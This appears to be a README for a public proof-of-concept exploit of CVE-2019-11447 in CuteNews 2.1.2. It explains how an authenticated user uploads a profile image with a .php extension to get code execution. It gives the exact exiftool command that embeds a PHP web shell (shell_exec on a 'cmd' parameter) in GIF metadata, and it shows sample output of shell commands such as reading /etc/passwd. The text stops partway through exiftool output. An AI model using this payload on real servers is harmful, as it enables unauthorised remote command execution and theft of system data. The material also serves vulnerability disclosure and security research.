# CVE-2019-11447-POC
CuteNews 2.1.2 Exploit - CVE-2019-11447 Proof-Of-Concept

POC by CRFSlick, discovered by AkkuS <Özkan Mustafa Akkuş>

The official CVE explanation is a bit confusing, so here's my take on it. If you are authenticated with CuteNews, not necessarily as an admin, then you can change certain things about your profile. One of those things that you can change is your profile image. If you upload a profile image and change the extension of your image to '.php', then you can easily visit the image under \<base uri\>/uploads and opening it will cause the webserver to load the file as PHP. Knowing this, you can embed valid PHP code inside of the metadata of your profile image to execute arbitrary code.

## Usage
```bash
Usage:
	CVE-2019-1144.py <username> <password> <base uri / login page>

$> whoami
www-data

$> cat /etc/passwd

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

## Evil GIF

The evil gif was grabbed from the internet and then modified using exiftool in order to insert the needed PHP
```bash
┌──(slick㉿kali)-[~/CVE-2019-11447-POC]
└─$ exiftool -Comment='<?php echo "'"\n\ndGhpc3dlYnNoZWxsb3V0cHV0c3RhcnRzaGVyZQ==\n\n\n"'"; echo shell_exec($_GET["'"cmd"'"]); echo "'"\n\ndGhpc3dlYnNoZWxsb3V0cHV0ZW5kc2hlcmU=\n\n"'";?>' sad.gif
```

Exiftool will show the metadata of the image where you will find the placed PHP code inside of the comment
```bash
┌──(slick㉿kali)-[~/CVE-2019-11447-POC]
└─$ exiftool sad.gif 
ExifTool Version Number         : 12.05
